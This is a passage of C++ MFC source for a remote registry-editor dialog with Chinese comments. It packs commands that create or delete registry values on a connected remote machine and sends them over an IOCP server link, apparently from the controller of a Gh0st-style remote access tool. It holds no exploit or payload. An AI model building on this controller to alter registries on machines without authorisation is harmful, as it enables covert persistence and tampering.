		msg.valsize = dlg.m_strValue.GetLength() * sizeof(TCHAR);        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;               //数据头
		buf[1] = MREG_DWORD;                           //值类型
		buf[2] = bToken;                           //父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		memcpy(tmp, dlg.m_strName.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_strValue.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);

		// 善后
		type = MREG_DWORD;
		nFlag = 4;
		Key = dlg.m_strName;
		Value = dlg.m_strValue;
		//
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;
		//LocalFree(buf);
	}
}

void CRegeditDlg::OnMenuitemExstr()
{
	// TODO: Add your command handler code here
	CRegeditTextDlg dlg(this);
	if (isEdit) {                //是编辑
		dlg.m_strName = Key;
		dlg.m_strValue = Value;
		dlg.EPath = true;

	}
	dlg.DoModal();
	if (dlg.isOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = GetFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() * sizeof(TCHAR) + dlg.m_strName.GetLength() * sizeof(TCHAR) + dlg.m_strValue.GetLength() * sizeof(TCHAR) + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);

		REGMSG msg;
		msg.count = FullPath.GetLength() * sizeof(TCHAR);            //项大小
		msg.size = dlg.m_strName.GetLength() * sizeof(TCHAR);          //键大小
		msg.valsize = dlg.m_strValue.GetLength() * sizeof(TCHAR);        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;               //数据头
		buf[1] = MREG_EXPAND_SZ;                           //值类型
		buf[2] = bToken;                           //父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		memcpy(tmp, dlg.m_strName.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_strValue.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);

		// 善后
		type = MREG_EXPAND_SZ;
		nFlag = 4;
		Key = dlg.m_strName;
		Value = dlg.m_strValue;
		//
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;
	}
}

void CRegeditDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	if (!isEnable)
		return;
	if (SelectNode == m_hRoot)
	{
		return;
	}



	m_listMenu.Detach();
	m_listMenu.DestroyMenu();
	m_listMenu.CreatePopupMenu();
	m_listMenu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("编辑(&E)"));
	m_listMenu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除(&D)"));
	//添加二级菜单
	CMenu MiNimenu_new;
	MiNimenu_new.CreatePopupMenu();
	m_listMenu.InsertMenu(25, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)MiNimenu_new.m_hMenu, _T("新建(&N)"));
	MiNimenu_new.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("字符串值(&Z)"));
	MiNimenu_new.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("DWORD 值(&D)"));
	MiNimenu_new.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("可扩字符串(&E)"));

	if (m_list.GetSelectedCount() == 0)             //没有选中
	{
		m_listMenu.EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //编辑
		m_listMenu.EnableMenuItem(1, MF_BYPOSITION | MF_GRAYED);     //删除
	}
	else {
		if (GetEditType(m_list.GetSelectionMark()) == 100)
			m_listMenu.EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //编辑
		m_listMenu.EnableMenuItem(2, MF_BYPOSITION | MF_GRAYED);         //新建

	}

	POINT mousepoint;
	GetCursorPos(&mousepoint);
	BOOL M_MiNiid = m_listMenu.TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepoint.x, mousepoint.y, this);
	if (!M_MiNiid) 	return;

	switch (M_MiNiid)
	{
	case 100:
	{
		OnMenuitemRegEdit();
	}
	break;
	case 200:
	{
		OnMenuitemRegDel();
	}
	break;
	case 300:
	{
		OnMenuitemRegStr();
	}
	break;
	case 400:
	{
		OnMenuitemRegDword();
	}
	break;
	case 500:
	{
		OnMenuitemExstr();
	}
	break;
	default:
		break;
	}



	*pResult = 0;
}

void CRegeditDlg::OnMenuitemRegDel()
{
	// TODO: Add your command handler code here
	REGMSG msg;

	int index = m_list.GetSelectionMark();

	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	char bToken = GetFatherPath(FullPath);

	CString key = m_list.GetItemText(index, 0);      //得到键名

	msg.size = FullPath.GetLength() * sizeof(TCHAR);              //  项名大小
	msg.valsize = key.GetLength() * sizeof(TCHAR);               //键名大小

	int datasize = sizeof(msg) + msg.size + msg.valsize + 4;
	char* buf = new char[datasize];
	ZeroMemory(buf, datasize);

	buf[0] = COMMAND_REG_DELVAL;     //命令头
	buf[1] = bToken;              //主键
	memcpy(buf + 2, (void*)&msg, sizeof(msg));                     //数据头
	if (msg.size > 0)        //根键 就不用写项了
		memcpy(buf + 2 + sizeof(msg), FullPath.GetBuffer(0), FullPath.GetLength() * sizeof(TCHAR));  //项值
	memcpy(buf + 2 + sizeof(msg) + FullPath.GetLength() * sizeof(TCHAR), key.GetBuffer(0), key.GetLength() * sizeof(TCHAR));  //键值
	nFlag = 3;
	this->index = index;
	m_iocpServer->Send(m_pContext, (LPBYTE)(buf), datasize);
	delete[] buf;

}



// 设置剪切板内容
void CRegeditDlg::SetClipboardText(CString szStr)
{
	if (::OpenClipboard(NULL))
	{
		if (EmptyClipboard())
		{
			size_t cbStr = (szStr.GetLength() + 1) * sizeof(TCHAR);
			HGLOBAL hData = GlobalAlloc(GMEM_MOVEABLE, cbStr);
			memcpy_s(GlobalLock(hData), cbStr, szStr.LockBuffer(), cbStr);
			szStr.UnlockBuffer();
			GlobalUnlock(hData);
			UINT nFormat = (sizeof(TCHAR) == sizeof(WCHAR) ? CF_UNICODETEXT : CF_TEXT);
			if (NULL == ::SetClipboardData(nFormat, hData))
			{
				CloseClipboard();
				return;
			}
		}
		CloseClipboard();        //关闭剪切板
	}
}

void CRegeditDlg::OnMenuitemTreeCopyname()
{
	// TODO: Add your command handler code here
	if (!isuser) return;
	
	
	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	SetClipboardText(FullPath);
	//CString msg;
	//msg.Format(_T("路径 %s 已复制到剪切板"), FullPath.GetBuffer(0));
	//MessageBox(msg, _T("提示"), MB_ICONINFORMATION);
	return;
}
